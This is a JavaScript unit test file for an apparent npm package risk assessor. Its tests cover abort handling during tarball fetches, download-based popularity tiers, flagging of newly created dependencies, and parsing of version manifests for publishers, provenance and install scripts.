test('an assessment given up on as its signal aborts, upstream\'s download still on its way', async t => {
  const slow = version('slow', '1.0.0', { 'package.json': '{}' }, {}, ago(30))
  let arrive = () => {}
  const fetching = new Promise(resolve => {
    t.mock.method(globalThis, 'fetch', input => {
      if (String(input) !== slow.doc.dist.tarball) return Promise.resolve(Response.json(documentOf({ name: 'slow', versions: [slow] })))
      resolve()
      return new Promise(answer => { arrive = () => answer(new Response(slow.tgz)) })
    })
  })
  const controller = new AbortController()
  const assessed = assessNpm('slow', '1.0.0', { now: NOW, downloads: false, signal: controller.signal })
  await fetching
  controller.abort(new Error('caller gone'))
  await assert.rejects(assessed, /caller gone/u)
  arrive()
})

test('a new dependency\'s package told by its downloads but its latest two weeks\', and its age where it is new since the version compared with', () => {
  const now = Date.parse('2026-10-12T12:00:00Z')
  const days = (perDay, latest = perDay) => ({ start: '2026-08-01', end: '2026-10-11', days: Array.from({ length: 72 }, (_, i) => i < 58 ? perDay : latest) })
  assert.deepEqual(npmSettledDownloads(days(100, 1e6), now), { start: '2026-08-01', end: '2026-09-27', days: Array.from({ length: 58 }, () => 100) }, 'to the day before its latest two weeks')
  assert.equal(npmAddedDependency({ downloads: days(100, 1e6) }, now).tier, Infinity, 'just pulled in, 1M a day of late: unpopular as it was')
  assert.deepEqual([npmAddedDependency({ downloads: days(4e6) }, now)].map(({ tier, wanted }) => [tier, wanted]), [[2000, false]], 'in the top 20,000: its age not asked')
  const axios = ['2026-03-27T19:01:40.000Z', '2026-03-31T00:21:58.000Z']
  assert.deepEqual(npmAddedDependency({ downloads: null, listed: { created: '2026-03-30T05:57:32.867Z', private: false }, published: axios }, now),
    { tier: Infinity, wanted: true, created: '2026-03-30T05:57:32.867Z', gap: 66_265_133 }, 'none counted: unpopular, and new since the version compared with')
  assert.equal(npmAddedDependency({ downloads: null, listed: { created: '2026-03-30T05:57:32.867Z', private: true }, published: axios }, now).tier, null, 'a private one: not told')
  assert.equal(npmAddedDependency({ downloads: days(0), listed: { created: '2020-01-01T00:00:00.000Z', private: false }, published: axios }, now).created, null, 'not one that existed before')
})

test('a version document read for what risk reads of it', () => {
  const [known] = publishers
  assert.deepEqual(npmVersionManifest({ _npmUser: { name: known, email: 'x@example.com' }, deprecated: 'use another', scripts: { prepare: 'tsc', postinstall: 'node x.js' },
    dependencies: { a: '1' }, devDependencies: { b: '1' }, dist: { attestations: { provenance: {} } } }),
  { deprecated: 'use another', publisher: known, knownAccounts: [known], dependencies: { a: '1' }, provenance: true, installScripts: { postinstall: 'node x.js' } })
  assert.deepEqual(npmVersionManifest({ _npmUser: { name: 'GitHub Actions', trustedPublisher: { id: 'github' } } }), { trustedPublisher: 'GitHub Actions' })
})
